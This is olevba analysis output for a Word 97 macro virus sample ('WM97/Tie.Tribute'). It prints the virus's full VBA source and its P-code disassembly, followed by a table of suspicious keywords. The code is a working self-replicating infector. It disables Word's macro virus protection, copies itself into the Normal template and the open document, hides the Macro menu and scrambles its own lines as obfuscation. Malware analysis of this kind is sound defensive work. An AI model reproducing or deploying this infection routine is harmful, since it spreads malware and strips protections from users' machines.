olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.do
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.do - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsxg, roxg, xixg, xxig As Integer: Dim xxey, xexy, exxy, exdy, cxiy, cixy, xicy, eoxy, xoey, oxey, ciiy, rxey, rexy, exry, nixy, ixny, nxiy, lnry, nrly, rnly As String

Randomize

On Error GoTo bit

Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48)

rt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo bit

If dt = 0 Then

    Set Tri = NormalTemplate.VBProject.VBComponents

    Set rip = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(45) + Chr(82) + Chr(101) + Chr(115) + Chr(116) + Chr(32) + Chr(73) + Chr(110) + Chr(32) + Chr(80) + Chr(101) + Chr(97) + Chr(99) + Chr(101) + Chr(45)

    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(101) + Chr(44) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(107) + Chr(105) + Chr(116) + Chr(116) + Chr(121) + Chr(32) + Chr(67) + Chr(97) + Chr(116) + Chr(33)
  
    If Month(Now()) = 3 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(73) + Chr(32) + Chr(77) + Chr(73) + Chr(83) + Chr(83) + Chr(32) + Chr(89) + Chr(79) + Chr(85) + Chr(32) + Chr(58) + Chr(126) + Chr(40)

    rip.Item(Cos(Atn(CInt(1)))).Name = Tri.Item(Cos(Atn(CInt(1)))).Name

    rip.Item(Cos(Atn(CInt(1)))).Export Application.StartupPath & System.Version & Chr(46) + Chr(84) + Chr(105) + Chr(101)
    
End If

If rt = 0 Then Set Tri = ActiveDocument.VBProject.VBComponents

Tri.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(46) + Chr(84) + Chr(105) + Chr(101)

With Tri.Item(Cos(Atn(CInt(1)))).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If dt = 0 Then Tri.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then Tri.Item(Cos(Atn(CInt(1)))).codemodule.replaceline 83, "Sub ToolsMarco()"

If dt = 0 Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = False

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Tri.Item(Cos(Atn(CInt(1)))).codemodule

   For j = Chr(50) To Tri.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Chr(50)

    rsxg = Int(Rnd(11) * 4998) + 24: roxg = Int(Rnd(15) * 5863) + 33: xixg = Int(Rnd(44) * 3544) + 55: xxig = Int(Rnd(23) * 5745) + 44

    ciiy = Asc(rsxg): eoxy = Chr$(ciiy + 5): xoey = Chr$(ciiy - 14): oxey = Chr$(ciiy + 22): lnry = Chr$(ciiy - 4)

    cixy = Asc(roxg): rxey = Chr$(cixy + 7): rexy = Chr$(cixy - 16): exry = Chr$(cixy + 4): nrly = Chr$(cixy - 17)

    xicy = Asc(xixg): nixy = Chr$(xicy + 9): ixny = Chr$(xicy - 18): nxiy = Chr$(xicy + 8): rnly = Chr$(xicy - 33)
    
    cxiy = Asc(xxig): xxey = Chr$(cxiy + 4): xexy = Chr$(cxiy - 3): exxy = Chr$(cxiy + 18): exdy = Chr$(cxiy - 12)

    .replaceline j, Chr(39) & xxey & xexy & exxy & exdy & eoxy & rxey & nixy & xoey & rexy & ixny & oxey & exry & nixy & lnry & nrly & rnly & xxey & xexy & exxy & exdy & xoey & rexy & ixny & oxey & exry & nixy & rnly & xxey & xexy & exxy & exdy & xoey & eoxy & rxey & nixy & xoey & rexy & nixy & xoey & rexy & ixny & oxey & exry & nixy & lnry & nrly & rnly & xxey & xexy & exxy & exdy & xoey & rexy & ixny & oxey & exry & nixy & rnly & xxey

   Next j

End With

bit:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode() 'WM97/Tie.Tribute by Virus :~(

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.do
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7554 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn rsxg
' 	VarDefn roxg
' 	VarDefn xixg
' 	VarDefn xxig (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxey
' 	VarDefn xexy
' 	VarDefn exxy
' 	VarDefn exdy
' 	VarDefn cxiy
' 	VarDefn cixy
' 	VarDefn xicy
' 	VarDefn eoxy
' 	VarDefn xoey
' 	VarDefn oxey
' 	VarDefn ciiy
' 	VarDefn rxey
' 	VarDefn rexy
' 	VarDefn exry
' 	VarDefn nixy
' 	VarDefn ixny
' 	VarDefn nxiy
' 	VarDefn lnry
' 	VarDefn nrly
' 	VarDefn rnly (As String)
' Line #3:
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' Line #6:
' 	OnError bit 
' Line #7:
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #13:
' Line #14:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo bit 
' 	EndIf 
' Line #15:
' Line #16:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #17:
' Line #18:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Tri 
' Line #19:
' Line #20:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set rip 
' Line #21:
' Line #22:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #23:
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #25:
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rip 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #29:
' Line #30:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld rip 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Tri 
' 	EndIf 
' Line #35:
' Line #36:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #41:
' Line #42:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' Line #46:
' 	EndWith 
' Line #47:
' Line #48:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #49:
' Line #50:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0053 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #51:
' Line #52:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	EndIf 
' Line #53:
' Line #54:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #55:
' Line #56:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #57:
' Line #58:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld Tri 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #59:
' Line #60:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x1386 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsxg 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St roxg 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xixg 
' 	BoS 0x0000 
' 	LitDI2 0x0017 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x1671 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x002C 
' 	Add 
' 	St xxig 
' Line #61:
' Line #62:
' 	Ld rsxg 
' 	ArgsLd Asc 0x0001 
' 	St ciiy 
' 	BoS 0x0000 
' 	Ld ciiy 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eoxy 
' 	BoS 0x0000 
' 	Ld ciiy 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoey 
' 	BoS 0x0000 
' 	Ld ciiy 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxey 
' 	BoS 0x0000 
' 	Ld ciiy 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnry 
' Line #63:
' Line #64:
' 	Ld roxg 
' 	ArgsLd Asc 0x0001 
' 	St cixy 
' 	BoS 0x0000 
' 	Ld cixy 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxey 
' 	BoS 0x0000 
' 	Ld cixy 
' 	LitDI2 0x0010 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rexy 
' 	BoS 0x0000 
' 	Ld cixy 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exry 
' 	BoS 0x0000 
' 	Ld cixy 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrly 
' Line #65:
' Line #66:
' 	Ld xixg 
' 	ArgsLd Asc 0x0001 
' 	St xicy 
' 	BoS 0x0000 
' 	Ld xicy 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nixy 
' 	BoS 0x0000 
' 	Ld xicy 
' 	LitDI2 0x0012 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixny 
' 	BoS 0x0000 
' 	Ld xicy 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxiy 
' 	BoS 0x0000 
' 	Ld xicy 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnly 
' Line #67:
' Line #68:
' 	Ld xxig 
' 	ArgsLd Asc 0x0001 
' 	St cxiy 
' 	BoS 0x0000 
' 	Ld cxiy 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St xxey 
' 	BoS 0x0000 
' 	Ld cxiy 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xexy 
' 	BoS 0x0000 
' 	Ld cxiy 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exxy 
' 	BoS 0x0000 
' 	Ld cxiy 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St exdy 
' Line #69:
' Line #70:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld xxey 
' 	Concat 
' 	Ld xexy 
' 	Concat 
' 	Ld exxy 
' 	Concat 
' 	Ld exdy 
' 	Concat 
' 	Ld eoxy 
' 	Concat 
' 	Ld rxey 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld rexy 
' 	Concat 
' 	Ld ixny 
' 	Concat 
' 	Ld oxey 
' 	Concat 
' 	Ld exry 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld lnry 
' 	Concat 
' 	Ld nrly 
' 	Concat 
' 	Ld rnly 
' 	Concat 
' 	Ld xxey 
' 	Concat 
' 	Ld xexy 
' 	Concat 
' 	Ld exxy 
' 	Concat 
' 	Ld exdy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld rexy 
' 	Concat 
' 	Ld ixny 
' 	Concat 
' 	Ld oxey 
' 	Concat 
' 	Ld exry 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld rnly 
' 	Concat 
' 	Ld xxey 
' 	Concat 
' 	Ld xexy 
' 	Concat 
' 	Ld exxy 
' 	Concat 
' 	Ld exdy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld eoxy 
' 	Concat 
' 	Ld rxey 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld rexy 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld rexy 
' 	Concat 
' 	Ld ixny 
' 	Concat 
' 	Ld oxey 
' 	Concat 
' 	Ld exry 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld lnry 
' 	Concat 
' 	Ld nrly 
' 	Concat 
' 	Ld rnly 
' 	Concat 
' 	Ld xxey 
' 	Concat 
' 	Ld xexy 
' 	Concat 
' 	Ld exxy 
' 	Concat 
' 	Ld exdy 
' 	Concat 
' 	Ld xoey 
' 	Concat 
' 	Ld rexy 
' 	Concat 
' 	Ld ixny 
' 	Concat 
' 	Ld oxey 
' 	Concat 
' 	Ld exry 
' 	Concat 
' 	Ld nixy 
' 	Concat 
' 	Ld rnly 
' 	Concat 
' 	Ld xxey 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #71:
' Line #72:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' Line #74:
' 	EndWith 
' Line #75:
' Line #76:
' 	Label bit 
' Line #77:
' Line #78:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #79:
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub ViewVBCode())
' 	QuoteRem 0x0011 0x001D "WM97/Tie.Tribute by Virus :~("
' Line #83:
' Line #84:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

